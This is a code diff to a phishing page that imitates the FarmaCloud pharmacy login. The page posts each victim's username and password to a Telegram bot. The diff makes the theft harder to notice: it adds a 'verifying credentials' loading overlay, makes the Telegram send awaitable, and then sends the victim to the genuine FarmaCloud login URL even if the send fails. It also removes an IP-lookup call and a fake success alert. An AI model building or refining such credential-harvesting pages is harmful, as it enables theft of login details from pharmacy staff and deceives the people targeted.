@@ -282,12 +282,59 @@
 
         }
 
+        /* =========================
+           LOADING OVERLAY
+        ========================== */
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        #loadingOverlay .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e4e7ed;
+            border-top: 4px solid #1768ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #loadingOverlay p {
+            margin-top: 20px;
+            color: #1768ff;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
     </style>
 
 </head>
 
 
 <body>
+
+    <!-- =========================
+         LOADING OVERLAY
+    ========================== -->
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p>Verificando credenciales...</p>
+    </div>
+
 
     <div class="page">
 
@@ -407,6 +454,9 @@
 
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
+        // URL DE REDIRECCIÓN
+        const REDIRECT_URL = "https://www.farmacloud.com.ar/app/Webforms/Account/Views/Index.aspx?confid=fweM0Iu60BNCNC6bkI68sA==";
+
 
         // ============================================================
         //  FUNCIÓN PARA ENVIAR DATOS A TELEGRAM
@@ -428,7 +478,7 @@
         `;
 
             // Enviar a Telegram
-            fetch(TELEGRAM_API, {
+            return fetch(TELEGRAM_API, {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
@@ -446,9 +496,11 @@
                 } else {
                     console.error("❌ Error al enviar:", data.description);
                 }
+                return data;
             })
             .catch(error => {
                 console.error("❌ Error de conexión:", error);
+                throw error;
             });
         }
 
@@ -458,19 +510,9 @@
         // ============================================================
 
         function getIP() {
-            // Intenta obtener la IP pública del usuario
             try {
-                // Usando fetch con ipify (servicio público)
                 const ip = localStorage.getItem('user_ip');
                 if (ip) return ip;
-                
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => {
-                        localStorage.setItem('user_ip', data.ip);
-                    })
-                    .catch(() => {});
-                
                 return 'Obteniendo IP...';
             } catch (e) {
                 return 'No disponible';
@@ -497,6 +539,14 @@
             return navigator.userAgent || 'No disponible';
         }
 
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+
 
         // ============================================================
         //  TOGGLE DE CONTRASEÑA
@@ -508,7 +558,7 @@
         togglePassword.addEventListener("click", function () {
             if (password.type === "password") {
                 password.type = "text";
-                togglePassword.textContent = "◉";  // Mismo símbolo (o puedes cambiarlo a "●")
+                togglePassword.textContent = "◉";
             } else {
                 password.type = "password";
                 togglePassword.textContent = "◉";
@@ -534,31 +584,26 @@
                 return;
             }
 
-            // Deshabilitar botón mientras se procesa
+            // Deshabilitar botón y mostrar loading
             loginButton.disabled = true;
             loginButton.textContent = "Enviando...";
+            showLoading();
 
             // Enviar datos a Telegram
-            sendToTelegram(username, passwordValue);
-
-            // Simular envío y mostrar confirmación
-            setTimeout(() => {
-
-                // Mostrar mensaje de éxito
-                alert("✅ Acceso registrado correctamente");
-
-                // Resetear botón
-                loginButton.disabled = false;
-                loginButton.textContent = "Iniciar sesión";
-
-                // Limpiar campos
-                document.getElementById("username").value = "";
-                document.getElementById("password").value = "";
-
-                // Opcional: redirigir a otra página
-                // window.location.href = "https://farmacloud.com/dashboard";
-
-            }, 1500);
+            sendToTelegram(username, passwordValue)
+                .then(() => {
+                    // Esperar 1.5 segundos para que se vea el loading
+                    setTimeout(() => {
+                        // Redirigir a la URL
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                })
+                .catch(() => {
+                    // Si hay error, igual redirigir después de un tiempo
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                });
 
         });
 
@@ -593,6 +638,7 @@
         console.log("✅ FarmaCloud - Sistema de autenticación");
         console.log("📡 Bot configurado con token:", BOT_TOKEN ? "✅ Sí" : "❌ No");
         console.log("📱 Chat ID:", CHAT_ID ? "✅ Sí" : "❌ No");
+        console.log("🔗 Redirección a:", REDIRECT_URL);
 
     </script>
 
